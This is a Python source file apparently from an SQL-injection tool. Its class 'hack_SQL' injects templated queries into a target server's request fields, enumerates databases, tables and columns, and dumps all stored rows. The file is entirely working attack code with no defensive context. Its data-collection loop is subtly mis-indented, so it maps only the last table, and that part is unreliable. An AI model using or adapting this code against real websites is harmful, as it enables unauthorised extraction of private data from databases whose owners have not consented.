from ..algorithm.app import App
import requests
import sys
import re

class hack_SQL(App):
    def __init__(self, obj):
        self.OBJ = obj['obj']
        self.SQL = obj['sql']
        self.TOKEN = self.OBJ['app_token']

    def mysql(self, column, table, row = 0):
        try:
            queries = self.getJSON(self.OBJ['dir_queryinject'])
            query = queries[ self.SQL['sqlinjectpos'] ]
            column = self.hackColumn([column], self.TOKEN, self.SQL['sep'])+self.SQL['sidecolumn']
            query = re.sub(r'(<%COLUMN%>)', column, query)
            query = re.sub(r'(<%TABLE%>)', table, query)
            LIMIT = self.SQL['limit'].replace('<%X%>', str(row)).replace('<%Y%>', str(1))
            query = re.sub(r'(<%LIMIT%>)', LIMIT, query)
            query = re.sub(r'(<%COMMENT%>)', self.SQL['comment'], query)
            
            obj = {}
            for attr in self.SQL['field']:
                obj.update({ attr : query })

            r = self.sendRequest(self.SQL['serverurl'], obj, self.SQL['method'])
            r = self.removeTOKEN(r, self.TOKEN)
        except:
            r = ''
        return r

    def SQLfindAll(self, column, table, matrix=False):
        val = " "
        arr = []
        count = 0
        while val:
            val = self.mysql(column, table, count)
            if val:
                if matrix:
                    val = val.split(';')
                arr.append(val)
                count += 1
        return arr

    def findDB(self):
        KQ = self.getJSON(self.OBJ['dir_knownquery'])
        EDB = self.getJSON(self.OBJ['dir_excludeddatabase'])
        sys.stdout.write('\nLoading: ')
        OBJ = {}
        for K in range(0, len(KQ)):
            for A in self.SQLfindAll(KQ[K][0][0],KQ[K][0][1]):
                if A not in EDB[K]:
                    for B in self.SQLfindAll(KQ[K][1][0], KQ[K][1][1].replace('<%tb%>', A)):
                        OBJ.update({A+'.'+B:[]})
                        for C in self.SQLfindAll(KQ[K][2][0], KQ[K][2][1].replace('<%tb%>', B)):
                            OBJ[A+'.'+B].append(C)
                            sys.stdout.write('.')
                            sys.stdout.flush()
        sys.stdout.write(' done!\n')
        return OBJ

    def findAllData(self):
        OBJ = {}
        for table, columns in self.findDB().items():
            values = self.SQLfindAll(self.unifyColumn(columns), table, matrix=True)
        for column in columns:
            OBJ.update({column:[]})
        try:
            for value in values:
                for v in range(0, len(value)):
                    OBJ[columns[v]].append(value[v])
        except:
            pass

        sys.stdout.write('\n>>> Searching all data...')
        return OBJ